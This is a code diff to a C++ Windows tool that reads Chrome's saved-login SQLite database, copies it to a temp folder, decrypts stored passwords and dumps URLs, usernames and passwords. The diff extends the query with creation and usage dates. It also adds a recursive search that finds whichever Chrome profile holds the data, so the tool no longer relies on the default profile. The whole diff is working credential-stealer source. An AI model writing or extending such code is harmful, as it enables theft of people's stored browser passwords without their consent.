@@ -18,7 +18,7 @@ stringstream getPass(
 	sqlite3 *db
 ) {
 	stringstream dump(string("")); // String stream for our output
-	const char *zSql = "SELECT action_url, username_value, password_value FROM logins";
+	const char *zSql = "SELECT origin_url, username_value, password_value, date_created, times_used, date_last_used FROM logins";
 	sqlite3_stmt *pStmt;
 	int rc;
 
@@ -77,6 +77,9 @@ stringstream getPass(
 		dump << "Url     :" << sqlite3_column_text(pStmt, 0) << endl;
 		dump << "Username:" << (char *)sqlite3_column_text(pStmt, 1) << endl;
   	    dump << "Password:" << decrypted << endl;
+		dump << "Created:" << (char *)sqlite3_column_text(pStmt, 3) << endl;
+		dump << "Used:" << (char *)sqlite3_column_text(pStmt, 4) << endl;
+		dump << "LastUsed:" << (char *)sqlite3_column_text(pStmt, 5) << endl;
 		dump << endl;
 		dump << endl;
 		rc = sqlite3_step(pStmt);
@@ -170,13 +173,55 @@ sqlite3* getDBHandler(char* dbFilePath) {
 		return db;
 	}
 }
+
+std::string getProfilePath(std::string path, std::string search)
+{
+	const CHAR* cCookiesJournal = "Cookies-journal";
+
+	WIN32_FIND_DATAA FindFileData;
+	ZeroMemory(&FindFileData, sizeof(FindFileData));
+	HANDLE hFind = FindFirstFileA((path + search).c_str(), &FindFileData);
+
+	if (INVALID_HANDLE_VALUE != hFind)
+	{
+		do {
+			if (
+				(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
+				&& FindFileData.cFileName[0] != '.'
+				&& FindFileData.cFileName[1] != '.'
+			)
+			{
+				std::string profilePath(getProfilePath(path + FindFileData.cFileName + "\\", cCookiesJournal));
+				if (!profilePath.empty())
+					return profilePath;
+			}
+			else
+			{
+				if (0 == strcmpi(FindFileData.cFileName, cCookiesJournal))
+				{
+					return path;
+				}
+			}
+
+			ZeroMemory(&FindFileData, sizeof(FindFileData));
+		} while (FindNextFileA(hFind, &FindFileData));
+
+		FindClose(hFind);
+		hFind = NULL;
+	}
+
+	//	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
+	return "";
+}
+
 //relative to chrome directory
 bool copyDB(char *source, char *dest) {
 	//Form path for Chrome's Login Data 
-	string path = getenv("LOCALAPPDATA");
-	// TODO Search for profile
-	path.append("\\Google\\Chrome\\User Data\\Default\\");
-//	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
+
+	std:string path = getProfilePath(std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\", "*");
+	if (path.empty())
+		path = getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default\\");
+
 	path.append(source);
 
 	string destPath = strTempPath + dest;
